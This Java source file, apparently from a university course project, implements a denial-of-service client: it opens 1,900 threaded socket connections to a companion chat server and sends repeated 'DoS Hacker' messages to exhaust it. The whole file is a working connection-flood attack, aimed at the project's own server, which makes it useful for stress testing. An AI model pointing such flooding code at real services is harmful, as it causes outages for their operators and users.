package edu.nyu.guangxiong.doschat;

import java.io.*;
import java.net.Socket;
import java.nio.charset.Charset;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicInteger;

/**
 * Author: GuangXIONG
 * Date: 05/05/2015
 * Time: 11:00 AM
 */

public class ChatClientDoSAttack {

    private static final int attackSize = 1900;

    private static final AtomicInteger running = new AtomicInteger(0);

    private static final ExecutorService executorService = Executors.newFixedThreadPool(attackSize);

    private static final Random random = new Random();

    public static void main(String[] args){
        System.out.println("DoS Chat Client, let the attacking begin~~");

        for (int i = 0; i < attackSize; i++) {
            executorService.submit(new Runnable() {
                @Override
                public void run() {
                    System.out.println("DoS No. " + running.incrementAndGet() +
                            " start connecting to Chat Server, waiting for response...");
                    try {
                        String mesg = running.toString() + "time regards from DoS Attacker~!!";
                        InputStream fakeIn = new ByteArrayInputStream(mesg.getBytes(Charset.forName("UTF-8")));
                        System.setIn(fakeIn);
                        Socket serverConnection = new Socket(ChatServer.SERVER_HOST, ChatServer.SERVER_PORT);
                        DoSChatter chatter = new DoSChatter(serverConnection.getInputStream(),
                                serverConnection.getOutputStream(), fakeIn);
                        chatter.run();
                    } catch (IOException ioe) {
                        System.out.println("Connection to Chat Server is over...");
                    }
                }
            });
        }
    }
}

class DoSChatter implements Runnable {

    private final InputStream chatServerInput;

    private final OutputStream chatServerOutput;

    private final InputStream userInput;

    private final Random random = new Random();

    public DoSChatter(InputStream chatServerInput, OutputStream chatServerOutput, InputStream userInput) {
        this.chatServerInput = chatServerInput;
        this.chatServerOutput = chatServerOutput;
        this.userInput = userInput;
    }

    @Override public void run() {
        // Read from userInput and write data to chatServerOutput
        Thread userThread = new Thread(new Runnable() {
            @Override
            public void run() {
                String mesg = "Salut from DoS Hacker  \n";
                InputStream fakeIn = new ByteArrayInputStream(mesg.getBytes(Charset.forName("UTF-8")));
                BufferedReader userBuffer = new BufferedReader(new InputStreamReader(fakeIn));
                try {
                    while(!Thread.currentThread().isInterrupted()){

                        Thread.sleep(random.nextInt(30) * 1000L);

                        String userText = userBuffer.readLine();
                        chatServerOutput.write(userText.getBytes());

                        mesg = "Attacking ";
                        fakeIn = new ByteArrayInputStream(mesg.getBytes(Charset.forName("UTF-8")));
                        userBuffer = new BufferedReader(new InputStreamReader(fakeIn));
                    }
                } catch (IOException ioe) {
                    ioe.printStackTrace();
                    System.out.println("\n\n\nYou have caused abnormal exceptions on Chat Server~!!");
                } catch (InterruptedException ie) {
                    Thread.currentThread().interrupt();
                }
            }
        });
        userThread.start();

        // Read from chatServerInput and print values
        Thread serverThread = new Thread(new Runnable() {
            @Override
            public void run() {

                BufferedReader serverBuffer = new BufferedReader(new InputStreamReader(chatServerInput));
                try {
                    while(!Thread.currentThread().isInterrupted()) {
                        String serverText = serverBuffer.readLine();
                        if (serverText.equals("null") || serverText == null) {
                            Thread.currentThread().interrupt();
                        }
                        System.out.println(serverText);
                    }
                } catch (IOException ioe) {
                    ioe.printStackTrace();
                    System.out.println("Connection to Chat Server is over~! you may retry...");
                }
            }
        });
        serverThread.start();
    }
}
